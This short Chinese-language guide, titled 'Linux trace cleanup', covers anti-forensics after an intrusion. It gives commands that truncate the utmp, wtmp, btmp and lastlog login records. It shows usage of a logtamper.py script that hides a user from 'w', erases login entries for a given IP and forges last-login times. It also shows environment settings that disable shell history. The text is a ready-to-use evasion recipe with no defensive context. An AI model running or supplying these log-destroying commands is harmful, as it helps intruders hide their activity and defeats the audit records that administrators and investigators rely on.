# Linux 痕迹清理

## 0x01 ssh登录日志

### 日志文件位置及命令
 | 命令	 | 日志文件	 | 功能 | 
 | ---- | ---- |---- |
 |w,who|/var/run/utmp|记录当前正在登录系统的用户信息，uptime记录系统启动时间|
 | last | 	/var/log/wtmp	 | 所有成功登录/登出的历史记录 | 
 | lastb | 	/var/log/btmp | 	登录失败尝试 | 
 | lastlog	 | /var/log/lastlog	 | 最近登录记录 | 

这些日志都是以二进制形式存储。   

### 清除方法
方案1，直接清空：  
```
# > /var/log/utmp
# > /var/log/wtmp
# > /var/log/btmp
# > /var/log/lastlog
```
方案2，使用脚本：

- [logtamper.py](./logtamper.py)
```
躲避管理员w查看(w)
python logtamper.py -m 1 -u root -i 192.168.0.188

清除指定ip的登录日志(lastb)
python logtamper.py -m 2 -u root -i 192.168.0.188

修改上次登录时间地点(lastlog)
python logtamper.py -m 3 -u root -i 192.168.0.188 -t tty1 -d 2014:05:28:10:11:12
```
### 不记录history
```
unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG
export HISTFILE=/dev/null
export HISTSIZE=0
export HISTFILESIZE=0
```
